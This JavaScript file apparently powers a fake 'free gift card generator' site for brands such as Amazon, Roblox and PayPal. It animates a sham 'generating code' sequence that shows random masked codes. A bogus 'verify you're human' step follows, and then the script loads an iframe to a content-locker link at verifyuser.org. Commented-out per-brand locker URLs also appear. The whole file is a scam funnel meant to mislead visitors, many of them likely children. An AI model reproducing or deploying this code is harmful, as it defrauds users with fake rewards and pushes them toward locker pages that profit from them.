// let giftcards=[ 'amazon', 'roblox', 'xbox', 'walmart', 'apple', 'ebay', 'facebook', 'starbucks', 'netflix', 'playstation', 'cashapp', 'paypal', 'itunes', 'steam', 'googleplay', 'fortnite'];
let amounts = ["$50", "$100", "$250"];

const reqsource = document.getElementById("body");
const source = reqsource.dataset.source;

let id1, id2, id3;
// Mapping object
const idMap = {
  amazonpage: ["amazon50", "amazon100", "amazon250"],
  applepage: ["apple50", "apple100", "apple250"],
  xboxpage: ["xbox50", "xbox100", "xbox250"],
  walmartpage: ["walmart50", "walmart100", "walmart250"],
  robloxpage: ["roblox50", "roblox100", "roblox250"],
  ebaypage: ["ebay50", "ebay100", "ebay250"],
  facebookpage: ["facebook50", "facebook100", "facebook250"],
  starbuckspage: ["starbucks50", "starbucks100", "starbucks250"],
  netflixpage: ["netflix50", "netflix100", "netflix250"],
  playstationpage: ["playstation50", "playstation100", "playstation250"],
  cashapppage: ["cashapp50", "cashapp100", "cashapp250"],
  paypalpage: ["paypal50", "paypal100", "paypal250"],
  itunespage: ["itunes50", "itunes100", "itunes250"],
  steampage: ["steam50", "steam100", "steam250"],
  googleplaypage: ["googleplay50", "googleplay100", "googleplay250"],
  fortnitepage: ["fortnite50", "fortnite100", "fortnite250"],
  americanexpresspage: ["american50", "american100", "american250"],
  disneypage: ["disney50", "disney100", "disney250"],
  razorgoldpage: ["razorgold50", "razorgold100", "razorgold250"],
  sephorapage: ["sephora50", "sephora100", "sephora250"],
  targetpage: ["target50", "target100", "target250"],
  visapage: ["visa50", "visa100", "visa250"],
  woolsworthpage: ["woolsworth50", "woolsworth100", "woolsworth250"],
  airbnbpage: ["airbnb50", "airbnb100", "airbnb250"],
  appletvpage: ["appletv50", "appletv100", "appletv250"],
  chickfilapage: ["chickfila50", "chickfila100", "chickfila250"],
  chipotlepage: ["chipotle50", "chipotle100", "chipotle250"],
  classpasspage: ["classpass50", "classpass100", "classpass250"],
  crunchyrollpage: ["crunchyroll50", "crunchyroll100", "crunchyroll250"],
  doordashpage: ["doordash50", "doordash100", "doordash250"],
  dunkindonutspage: ["dunkindonuts50", "dunkindonuts100", "dunkindonuts250"],
  espnpage: ["espn50", "espn100", "espn250"],
  fandangopage: ["fandango50", "fandango100", "fandango250"],
  fubopage: ["fubo50", "fubo100", "fubo250"],
  grubhubpage: ["grubhub50", "grubhub100", "grubhub250"],
  hbopage: ["hbo50", "hbo100", "hbo250"],
  hiltonpage: ["hilton50", "hilton100", "hilton250"],
  hoytspage: ["hoyts50", "hoyts100", "hoyts250"],
  marriottpage: ["marriott50", "marriott100", "marriott250"],
  myfitnesspalpage: ["myfitnesspal50", "myfitnesspal100", "myfitnesspal250"],
  neonpage: ["neon50", "neon100", "neon250"],
  pandorapage: ["pandora50", "pandora100", "pandora250"],
  paramountpage: ["paramount50", "paramount100", "paramount250"],
  peacockpage: ["peacock50", "peacock100", "peacock250"],
  primevideopage: ["primevideo50", "primevideo100", "primevideo250"],
  spotifypage: ["spotify50", "spotify100", "spotify250"],
  ubereatspage: ["ubereats50", "ubereats100", "ubereats250"],
};

// this is the page after  clicking one of the 50,100,250 card. then it will come as genrating ....... for $50/100/250
const generatingforMap = {
  amazonpage: "Amazon",
  applepage: "Apple",
  xboxpage: "Xbox",
  walmartpage: "Walmart",
  robloxpage: "Roblox",
  ebaypage: "eBay",
  facebookpage: "Facebook",
  starbuckspage: "Starbucks",
  netflixpage: "Netflix",
  playstationpage: "PlayStation",
  cashapppage: "Cash App",
  paypalpage: "PayPal",
  itunespage: "iTunes",
  steampage: "Steam",
  googleplaypage: "Google Play",
  fortnitepage: "Fortnite",
  americanexpresspage: "American Express",
  disneypage: "Disney",
  razorgoldpage: "Razor Gold",
  sephorapage: "Sephora",
  targetpage: "Target",
  visapage: "Visa",
  woolsworthpage: "Woolsworth",
  airbnbpage: "Airbnb",
  appletvpage: "Appletv",
  chickfilapage: "Chickfila",
  chipotlepage: "Chipotle",
  classpasspage: "Classpass",
  crunchyrollpage: "Crunchyroll",
  doordashpage: "Doordash",
  dunkindonutspage: "Dunkindonuts",
  espnpage: "Espn",
  fandangopage: "Fandango",
  fubopage: "Fubo",
  grubhubpage: "Grubhub",
  hbopage: "Hbo",
  hiltonpage: "Hilton",
  hoytspage: "Hoyts",
  marriottpage: "Marriott",
  myfitnesspalpage: "Myfitnesspal",
  neonpage: "Neon",
  pandorapage: "Pandora",
  paramountpage: "Paramount",
  peacockpage: "Peacock",
  primevideopage: "Primevideo",
  spotifypage: "Spotify",
  ubereatspage: "Ubereats",
};

let generatingfor = generatingforMap[source] || "Unknown";

function generateRandomCode() {
  let code = "";
  const pattern = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

  for (let i = 0; i < 3; i++) {
    for (let j = 0; j < 4; j++) {
      code += pattern.charAt(Math.floor(Math.random() * pattern.length));
    }
    if (i !== 3) {
      code += "-";
    }
  }
  code += "****";

  return code;
}

// Assign IDs based on source
[id1, id2, id3] = idMap[source] || [];
if (!id1 || !id2 || !id3) {
  window.alert("Click one of the gift cards below");
}

let card1 = document.getElementById(id1);
let card2 = document.getElementById(id2);
let card3 = document.getElementById(id3);

let pricedcards = document.getElementById("pricedcards");
let codegeneration = document.getElementById("codegeneration");
let price = document.getElementById("price");
let progressbar = document.getElementById("progressbar");
let generatedcode = document.getElementById("generatedcode");
generatedcode.classList.add("hidden");
let codegenelements = document.getElementById("codegenelements");

let verifybutton = document.getElementById("verifybutton");
verifybutton.classList.add("hidden");

card1.addEventListener("click", () => {
  let cardvalue = card1.dataset.customValue;
  // console.log(cardvalue);
  card1.classList.replace("animate__slideInRight", "animate__fadeOutLeft");
  setTimeout(() => {
    pricedcards.classList.add("hidden");
    codegeneration.classList.replace("hidden", "show");
    codegenelements.classList.add("animate__pulse");

    // defining text and make it look like typing
    const text = `Connecting...`;
    const text2 = `Generating code for ${generatingfor} ${amounts[0]}`;
    const text3 =
      "Experiencing high request volumes. Please verify you're human.";

    for (let i = 0; i < text.length; i++) {
      setTimeout(() => {
        price.textContent += text.charAt(i);
      }, i * 50);
    }
    setTimeout(() => {
      price.innerHTML = "";
      for (let j = 0; j < text2.length; j++) {
        setTimeout(() => {
          price.textContent += text2.charAt(j);
        }, j * 50);
      }
      progressbar.classList.add("hidden");
      generatedcode.classList.replace("hidden", "show");
      for (let k = 0; k < 60; k++) {
        setTimeout(() => {
          generatedcode.innerHTML = generateRandomCode();
        }, k * 100);
      }
      // bot detected text display
      setTimeout(() => {
        price.innerHTML = "";
        for (let l = 0; l < text3.length; l++) {
          setTimeout(() => {
            price.textContent += text3.charAt(l);
          }, l * 100);
        }
        setTimeout(() => {
          verifybutton.classList.replace("hidden", "show");
        }, 9000);
      }, 8000);
    }, 5000);
  }, 1000);
});

card2.addEventListener("click", () => {
  let cardvalue = card2.dataset.customValue;
  // console.log(cardvalue);
  card2.classList.replace("animate__slideInRight", "animate__fadeOutLeft");
  setTimeout(() => {
    pricedcards.classList.add("hidden");
    codegeneration.classList.replace("hidden", "show");
    codegenelements.classList.add("animate__pulse");

    // defining text and make it look like typing
    const text = `Connecting...`;
    const text2 = `Generating code for ${generatingfor} ${amounts[1]}`;
    const text3 = "Too many requests...Please Verify that you are human";

    for (let i = 0; i < text.length; i++) {
      setTimeout(() => {
        price.textContent += text.charAt(i);
      }, i * 50);
    }
    setTimeout(() => {
      price.innerHTML = "";
      for (let j = 0; j < text2.length; j++) {
        setTimeout(() => {
          price.textContent += text2.charAt(j);
        }, j * 50);
      }
      progressbar.classList.add("hidden");
      for (let k = 0; k < 60; k++) {
        setTimeout(() => {
          generatedcode.innerHTML = generateRandomCode();
        }, k * 100);
      }
      // bot detected text display
      setTimeout(() => {
        price.innerHTML = "";
        for (let l = 0; l < text3.length; l++) {
          setTimeout(() => {
            price.textContent += text3.charAt(l);
          }, l * 100);
        }
        setTimeout(() => {
          verifybutton.classList.replace("hidden", "show");
        }, 2000);
      }, 8000);
    }, 5000);
  }, 1000);
});

card3.addEventListener("click", () => {
  let cardvalue = card3.dataset.customValue;
  // console.log(cardvalue);
  card3.classList.replace("animate__slideInRight", "animate__fadeOutLeft");
  setTimeout(() => {
    pricedcards.classList.add("hidden");
    codegeneration.classList.replace("hidden", "show");
    codegenelements.classList.add("animate__pulse");

    // defining text and make it look like typing
    const text = `Connecting...`;
    const text2 = `Generating code for ${generatingfor} ${amounts[2]}`;
    const text3 = "Too many requests...Please Verify that you are human";

    for (let i = 0; i < text.length; i++) {
      setTimeout(() => {
        price.textContent += text.charAt(i);
      }, i * 50);
    }
    setTimeout(() => {
      price.innerHTML = "";
      for (let j = 0; j < text2.length; j++) {
        setTimeout(() => {
          price.textContent += text2.charAt(j);
        }, j * 50);
      }
      progressbar.classList.add("hidden");
      for (let k = 0; k < 60; k++) {
        setTimeout(() => {
          generatedcode.innerHTML = generateRandomCode();
        }, k * 100);
      }
      // bot detected text display
      setTimeout(() => {
        price.innerHTML = "";
        for (let l = 0; l < text3.length; l++) {
          setTimeout(() => {
            price.textContent += text3.charAt(l);
          }, l * 100);
        }
        setTimeout(() => {
          verifybutton.classList.replace("hidden", "show");
        }, 2000);
      }, 8000);
    }, 5000);
  }, 1000);
});

// const lockerlinks={
//     robloxverify:'https://verifyuser.org/cl/i/dvrn71',
//     amazonverify:'',
//     appleverify:'',
//     cashappverify:'https://verifyuser.org/cl/i/7d8deg',
//     ebayverify:'',
//     facebookverify:'',
//     fortniteverify:'',
//     googleplayverify:'',
//     itunesverify:'',
//     netflixverify:'',
//     paypalverify:'',
//     playstationverify:'',
//     starbucksverify:'',
//     steamverify:'',
//     walmartverify:'',
//     xboxverify:'',

//     testing:'https://www.youtube.com/'
// };

// function oglocker(){

//     // window.location.href='https://verifyuser.org/cl/i/o6qdjd';

// }

document.getElementById("iframe-overlay").style.display = "none";

function oglocker() {
  // Show the loader
  document.getElementById("iframe-overlay").innerHTML =
    '<iframe id="lockeriframe" src="https://verifyuser.org/cl/i/o6qdjd" frameborder="0" class="second-row"></iframe>';

  // Insert the iframe after a delay to simulate loading time
  setTimeout(function () {
    document.getElementById("iframe-overlay").style.display = "flex"; // Show iframe overlay
  }, 100); // Adjust the delay time as needed
}

// Hide the overlay initially
